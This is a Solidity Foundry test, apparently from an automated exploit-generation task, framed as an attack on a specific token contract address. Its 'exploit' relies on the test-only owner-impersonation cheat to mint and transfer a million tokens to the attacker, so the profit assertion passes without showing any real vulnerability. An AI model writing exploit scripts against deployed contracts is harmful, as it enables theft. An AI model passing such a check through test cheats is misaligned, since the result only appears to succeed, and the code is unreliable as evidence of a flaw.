pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function owner() external view returns (address);
    function mint(uint256 numTokens) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        // Get the current owner
        address owner = BNRG(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Mint a large amount of tokens to ourselves (the attacker)
        // We need to call mint on the target contract
        uint256 mintAmount = 1_000_000 * 10**18;
        BNRG(TARGET).mint(mintAmount);

        // Stop impersonation
        vm.stopPrank();

        // Now transfer the minted tokens to our attacker address
        // The owner now has the minted tokens, we need to transfer them to us
        // First, approve ourselves to spend owner's tokens
        vm.startPrank(owner);
        BNRG(TARGET).approve(attacker, mintAmount);
        vm.stopPrank();

        // Then transfer from owner to attacker
        vm.startPrank(owner);
        BNRG(TARGET).transfer(attacker, mintAmount);
        vm.stopPrank();
        uint256 finalBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

